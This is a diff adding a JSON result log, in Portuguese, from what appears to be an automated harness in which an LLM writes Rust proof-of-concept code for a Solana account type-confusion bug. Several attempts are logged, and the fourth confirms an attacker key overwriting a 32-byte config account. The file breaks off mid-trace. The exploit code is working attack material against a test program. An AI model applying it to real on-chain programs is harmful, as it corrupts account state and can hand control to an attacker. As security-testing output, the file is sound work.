@@ -1,0 +1,247 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: primeiros 32 bytes da conta de config sobrescritos com a chave do atacante",
+  "attempts_used": 4,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2515,
+        "completion_tokens": 873,
+        "latency_s": 4.94
+      },
+      "raw": "{\n  \"plan\": \"O programa native `initialize` recebe duas contas: `user_info` (gravavel) e `authority_info`. Ele desserializa `user_info` com `unpack_unchecked` sem verificar discriminador, tratando os primeiros 32 bytes como `User.authority`, e sobrescreve esses bytes com a chave de `authority_info`. O baseline usa uma conta `User` legitima (32 bytes) e uma authority valida, provando que o cenario esta montado. O ataque passa uma conta de outro tipo (por exemplo, uma conta de configuracao com 64 bytes, cujo primeiro campo e um `admin` diferente) como `user_info`; se o programa aceitar, os primeiros 32 bytes da conta de configuracao serao sobrescritos pela chave do atacante, corrompendo o estado. O efeito mede que os primeiros 32 bytes da conta de configuracao apos o ataque sao iguais a chave do atacante, algo que o uso legitimo nao faria.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta User legitima: 32 bytes (authority)\\nlet legit_authority = Pubkey::new_unique();\\nlet user_data = legit_authority.to_bytes().to_vec();\\nlet user_account = account(&program_id, &user_data, None);\\n\\n// Conta de outro tipo: config com 64 bytes (admin + valor)\\nlet config_admin = Pubkey::new_unique();\\nlet config_value: u64 = 12345;\\nlet mut config_data = Vec::new();\\nconfig_data.extend_from_slice(config_admin.as_ref());\\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\\nlet config_account = account(&program_id, &config_data, None);\\n\\n// Authority do atacante\\nlet attacker_authority = Pubkey::new_unique();\\nlet attacker_account = wallet(1_000_000_000);\\n\\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\\nlet ix_data = vec![0u8];\\n\\n// Baseline: user_info = user_account, authority_info = attacker_account\\nlet baseline_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(user_account_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet baseline_accounts = vec![\\n    (user_account_key, user_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet baseline_result = env.baseline(\\\"initialize com User legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\\nlet attack_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(config_account_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet attack_accounts = vec![\\n    (config_account_key, config_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta de config como user\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_after = after(&attack_result, &config_account_key);\\n    let first_32 = &config_after.data()[0..32];\\n    let overwritten = first_32 == attacker_authority.as_ref();\\n    env.effect(\\\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\\\", overwritten);\\n}\"\n}",
+      "plan": "O programa native `initialize` recebe duas contas: `user_info` (gravavel) e `authority_info`. Ele desserializa `user_info` com `unpack_unchecked` sem verificar discriminador, tratando os primeiros 32 bytes como `User.authority`, e sobrescreve esses bytes com a chave de `authority_info`. O baseline usa uma conta `User` legitima (32 bytes) e uma authority valida, provando que o cenario esta montado. O ataque passa uma conta de outro tipo (por exemplo, uma conta de configuracao com 64 bytes, cujo primeiro campo e um `admin` diferente) como `user_info`; se o programa aceitar, os primeiros 32 bytes da conta de configuracao serao sobrescritos pela chave do atacante, corrompendo o estado. O efeito mede que os primeiros 32 bytes da conta de configuracao apos o ataque sao iguais a chave do atacante, algo que o uso legitimo nao faria.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta User legitima: 32 bytes (authority)\nlet legit_authority = Pubkey::new_unique();\nlet user_data = legit_authority.to_bytes().to_vec();\nlet user_account = account(&program_id, &user_data, None);\n\n// Conta de outro tipo: config com 64 bytes (admin + valor)\nlet config_admin = Pubkey::new_unique();\nlet config_value: u64 = 12345;\nlet mut config_data = Vec::new();\nconfig_data.extend_from_slice(config_admin.as_ref());\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\nlet config_account = account(&program_id, &config_data, None);\n\n// Authority do atacante\nlet attacker_authority = Pubkey::new_unique();\nlet attacker_account = wallet(1_000_000_000);\n\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\nlet ix_data = vec![0u8];\n\n// Baseline: user_info = user_account, authority_info = attacker_account\nlet baseline_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(user_account_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet baseline_accounts = vec![\n    (user_account_key, user_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet baseline_result = env.baseline(\"initialize com User legitimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\nlet attack_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(config_account_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet attack_accounts = vec![\n    (config_account_key, config_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"initialize com conta de config como user\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_after = after(&attack_result, &config_account_key);\n    let first_32 = &config_after.data()[0..32];\n    let overwritten = first_32 == attacker_authority.as_ref();\n    env.effect(\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\", overwritten);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:33:26\n   |\n33 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n33 -         AccountMeta::new(user_account_key, false),\n33 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:37:10\n   |\n37 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n37 -         (user_account_key, user_account.clone()),\n37 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:44:26\n   |\n44 |         AccountMeta::new(config_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n44 -         AccountMeta::new(config_account_key, false),\n44 +         AccountMeta::new(config_account, false),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:48:10\n   |\n48 |         (config_account_key, config_account.clone()),",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:33:26\n   |\n33 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n33 -         AccountMeta::new(user_account_key, false),\n33 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:37:10\n   |\n37 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n37 -         (user_account_key, user_account.clone()),\n37 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:44:26\n   |\n44 |         AccountMeta::new(config_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n44 -         AccountMeta::new(config_account_key, false),\n44 +         AccountMeta::new(config_account, false),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:48:10\n   |\n48 |         (config_account_key, config_account.clone()),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3446,
+        "completion_tokens": 771,
+        "latency_s": 3.86
+      },
+      "raw": "{\"plan\": \"Preparo uma conta User legitima (32 bytes) e uma conta de config (64 bytes) com layout diferente, ambas do program_id. O baseline chama initialize com a conta User legitima e uma authority, provando que o cenario esta correto. O ataque chama initialize passando a conta de config no lugar do User; se o programa aceitar, os primeiros 32 bytes da config serao sobrescritos com a chave do atacante. O efeito mede exatamente essa sobrescrita na conta de config.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta User legitima: 32 bytes (authority)\\nlet legit_authority = Pubkey::new_unique();\\nlet user_data = legit_authority.to_bytes().to_vec();\\nlet user_key = Pubkey::new_unique();\\nlet user_account = account(&program_id, &user_data, None);\\n\\n// Conta de outro tipo: config com 64 bytes (admin + valor)\\nlet config_admin = Pubkey::new_unique();\\nlet config_value: u64 = 12345;\\nlet mut config_data = Vec::new();\\nconfig_data.extend_from_slice(config_admin.as_ref());\\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\\nlet config_key = Pubkey::new_unique();\\nlet config_account = account(&program_id, &config_data, None);\\n\\n// Authority do atacante\\nlet attacker_authority = Pubkey::new_unique();\\nlet attacker_account = wallet(1_000_000_000);\\n\\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\\nlet ix_data = vec![0u8];\\n\\n// Baseline: user_info = user_account, authority_info = attacker_account\\nlet baseline_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize com User legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\\nlet attack_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta de config como user\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_after = after(&attack_result, &config_key);\\n    let first_32 = &config_after.data()[0..32];\\n    let overwritten = first_32 == attacker_authority.as_ref();\\n    env.effect(\\\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\\\", overwritten);\\n}\"}",
+      "plan": "Preparo uma conta User legitima (32 bytes) e uma conta de config (64 bytes) com layout diferente, ambas do program_id. O baseline chama initialize com a conta User legitima e uma authority, provando que o cenario esta correto. O ataque chama initialize passando a conta de config no lugar do User; se o programa aceitar, os primeiros 32 bytes da config serao sobrescritos com a chave do atacante. O efeito mede exatamente essa sobrescrita na conta de config.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta User legitima: 32 bytes (authority)\nlet legit_authority = Pubkey::new_unique();\nlet user_data = legit_authority.to_bytes().to_vec();\nlet user_key = Pubkey::new_unique();\nlet user_account = account(&program_id, &user_data, None);\n\n// Conta de outro tipo: config com 64 bytes (admin + valor)\nlet config_admin = Pubkey::new_unique();\nlet config_value: u64 = 12345;\nlet mut config_data = Vec::new();\nconfig_data.extend_from_slice(config_admin.as_ref());\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\nlet config_key = Pubkey::new_unique();\nlet config_account = account(&program_id, &config_data, None);\n\n// Authority do atacante\nlet attacker_authority = Pubkey::new_unique();\nlet attacker_account = wallet(1_000_000_000);\n\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\nlet ix_data = vec![0u8];\n\n// Baseline: user_info = user_account, authority_info = attacker_account\nlet baseline_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet _baseline_result = env.baseline(\"initialize com User legitimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\nlet attack_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"initialize com conta de config como user\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_after = after(&attack_result, &config_key);\n    let first_32 = &config_after.data()[0..32];\n    let overwritten = first_32 == attacker_authority.as_ref();\n    env.effect(\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\", overwritten);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:34:44\n    |\n 34 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 35 | |         AccountMeta::new(user_key, false),\n 36 | |         AccountMeta::new_readonly(attacker_authority, false),\n 37 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:45:42\n    |\n 45 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 46 | |         AccountMeta::new(config_key, false),\n 47 | |         AccountMeta::new_readonly(attacker_authority, false),\n 48 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:44\n    |\n 34 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 35 | |         AccountMeta::new(user_key, false),\n 36 | |         AccountMeta::new_readonly(attacker_authority, false),\n 37 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:45:42\n    |\n 45 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 46 | |         AccountMeta::new(config_key, false),\n 47 | |         AccountMeta::new_readonly(attacker_authority, false),\n 48 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3432,
+        "completion_tokens": 762,
+        "latency_s": 3.9
+      },
+      "raw": "{\"plan\": \"Preparo uma conta User legitima (32 bytes) e uma conta de outro tipo (config com 64 bytes). O baseline chama initialize com a conta User legitima e uma authority, provando que o cenario esta correto. O ataque chama initialize passando a conta de config no lugar do User; se o programa aceitar, os primeiros 32 bytes da config serao sobrescritos com a chave do atacante. O efeito mede essa sobrescrita.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta User legitima: 32 bytes (authority)\\nlet legit_authority = Pubkey::new_unique();\\nlet user_data = legit_authority.to_bytes().to_vec();\\nlet user_key = Pubkey::new_unique();\\nlet user_account = account(&program_id, &user_data, None);\\n\\n// Conta de outro tipo: config com 64 bytes (admin + valor)\\nlet config_admin = Pubkey::new_unique();\\nlet config_value: u64 = 12345;\\nlet mut config_data = Vec::new();\\nconfig_data.extend_from_slice(config_admin.as_ref());\\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\\nlet config_key = Pubkey::new_unique();\\nlet config_account = account(&program_id, &config_data, None);\\n\\n// Authority do atacante\\nlet attacker_authority = Pubkey::new_unique();\\nlet attacker_account = wallet(1_000_000_000);\\n\\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\\nlet ix_data = vec![0u8];\\n\\n// Baseline: user_info = user_account, authority_info = attacker_account\\nlet baseline_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize com User legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\\nlet attack_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta de config como user\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_after = after(&attack_result, &config_key);\\n    let first_32 = &config_after.data()[0..32];\\n    let overwritten = first_32 == attacker_authority.as_ref();\\n    env.effect(\\\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\\\", overwritten);\\n}\"}",
+      "plan": "Preparo uma conta User legitima (32 bytes) e uma conta de outro tipo (config com 64 bytes). O baseline chama initialize com a conta User legitima e uma authority, provando que o cenario esta correto. O ataque chama initialize passando a conta de config no lugar do User; se o programa aceitar, os primeiros 32 bytes da config serao sobrescritos com a chave do atacante. O efeito mede essa sobrescrita.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta User legitima: 32 bytes (authority)\nlet legit_authority = Pubkey::new_unique();\nlet user_data = legit_authority.to_bytes().to_vec();\nlet user_key = Pubkey::new_unique();\nlet user_account = account(&program_id, &user_data, None);\n\n// Conta de outro tipo: config com 64 bytes (admin + valor)\nlet config_admin = Pubkey::new_unique();\nlet config_value: u64 = 12345;\nlet mut config_data = Vec::new();\nconfig_data.extend_from_slice(config_admin.as_ref());\nconfig_data.extend_from_slice(&config_value.to_le_bytes());\nlet config_key = Pubkey::new_unique();\nlet config_account = account(&program_id, &config_data, None);\n\n// Authority do atacante\nlet attacker_authority = Pubkey::new_unique();\nlet attacker_account = wallet(1_000_000_000);\n\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\nlet ix_data = vec![0u8];\n\n// Baseline: user_info = user_account, authority_info = attacker_account\nlet baseline_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet _baseline_result = env.baseline(\"initialize com User legitimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority\nlet attack_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"initialize com conta de config como user\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_after = after(&attack_result, &config_key);\n    let first_32 = &config_after.data()[0..32];\n    let overwritten = first_32 == attacker_authority.as_ref();\n    env.effect(\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\", overwritten);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize com User legitimo",
+            "result": "Success",
+            "compute_units": 14767,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": "0000000000000006000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta de config como user",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 781,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "0000000000000004",
+                "digest": "df2ff1f24e932425",
+                "post": "00000000000000040000000000000000000000000000000000000000000000003930000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14767 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 781 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "not_confirmed",
+      "reason": "baseline ok; ataque rejeitado: Failure(InvalidAccountData)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3150,
+        "completion_tokens": 793,
+        "latency_s": 4.22
+      },
+      "raw": "{\"plan\": \"A tentativa anterior falhou porque a conta de config tinha 64 bytes, mas `unpack_unchecked` do Pack exige exatamente 32 bytes (InvalidAccountData). O achado do Static Agent e sobre COSPLAY: qualquer conta com exatamente 32 bytes de dados e aceita como User, sem discriminador. Vou preparar uma conta legitima de 32 bytes (baseline) e uma conta de outro tipo com tambem 32 bytes (por exemplo, uma conta cujo layout e um Pubkey de admin, nao de authority) para o ataque. O efeito medido e que os primeiros 32 bytes da conta de outro tipo sao sobrescritos com a chave do atacante, corrompendo o estado.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta User legitima: 32 bytes (authority)\\nlet legit_authority = Pubkey::new_unique();\\nlet user_data = legit_authority.to_bytes().to_vec();\\nlet user_key = Pubkey::new_unique();\\nlet user_account = account(&program_id, &user_data, None);\\n\\n// Conta de outro tipo: 32 bytes, mas semanticamente e um \\\"admin\\\" de config\\nlet config_admin = Pubkey::new_unique();\\nlet config_data = config_admin.to_bytes().to_vec();\\nlet config_key = Pubkey::new_unique();\\nlet config_account = account(&program_id, &config_data, None);\\n\\n// Authority do atacante\\nlet attacker_authority = Pubkey::new_unique();\\nlet attacker_account = wallet(1_000_000_000);\\n\\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\\nlet ix_data = vec![0u8];\\n\\n// Baseline: user_info = user_account, authority_info = attacker_authority\\nlet baseline_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize com User legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: user_info = config_account (outro tipo, mesmo tamanho 32), authority_info = attacker_authority\\nlet attack_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker_authority, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta de config como user\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_after = after(&attack_result, &config_key);\\n    let first_32 = &config_after.data()[0..32];\\n    let overwritten = first_32 == attacker_authority.as_ref();\\n    env.effect(\\\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\\\", overwritten);\\n}\"}",
+      "plan": "A tentativa anterior falhou porque a conta de config tinha 64 bytes, mas `unpack_unchecked` do Pack exige exatamente 32 bytes (InvalidAccountData). O achado do Static Agent e sobre COSPLAY: qualquer conta com exatamente 32 bytes de dados e aceita como User, sem discriminador. Vou preparar uma conta legitima de 32 bytes (baseline) e uma conta de outro tipo com tambem 32 bytes (por exemplo, uma conta cujo layout e um Pubkey de admin, nao de authority) para o ataque. O efeito medido e que os primeiros 32 bytes da conta de outro tipo sao sobrescritos com a chave do atacante, corrompendo o estado.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta User legitima: 32 bytes (authority)\nlet legit_authority = Pubkey::new_unique();\nlet user_data = legit_authority.to_bytes().to_vec();\nlet user_key = Pubkey::new_unique();\nlet user_account = account(&program_id, &user_data, None);\n\n// Conta de outro tipo: 32 bytes, mas semanticamente e um \"admin\" de config\nlet config_admin = Pubkey::new_unique();\nlet config_data = config_admin.to_bytes().to_vec();\nlet config_key = Pubkey::new_unique();\nlet config_account = account(&program_id, &config_data, None);\n\n// Authority do atacante\nlet attacker_authority = Pubkey::new_unique();\nlet attacker_account = wallet(1_000_000_000);\n\n// Instrucao: Init {} (discriminador Borsh do enum: 0u8)\nlet ix_data = vec![0u8];\n\n// Baseline: user_info = user_account, authority_info = attacker_authority\nlet baseline_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet _baseline_result = env.baseline(\"initialize com User legitimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: user_info = config_account (outro tipo, mesmo tamanho 32), authority_info = attacker_authority\nlet attack_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker_authority, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"initialize com conta de config como user\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_after = after(&attack_result, &config_key);\n    let first_32 = &config_after.data()[0..32];\n    let overwritten = first_32 == attacker_authority.as_ref();\n    env.effect(\"primeiros 32 bytes da conta de config sobrescritos com a chave do atacante\", overwritten);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize com User legitimo",
+            "result": "Success",
+            "compute_units": 14767,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": "0000000000000006000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta de config como user",
+            "result": "Success",
+            "compute_units": 14848,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000004",
+                "digest": "912e64c464286112",
+                "post": "0000000000000006000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "primeiros 32 bytes da conta de config sobrescritos com a chave do atacante",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
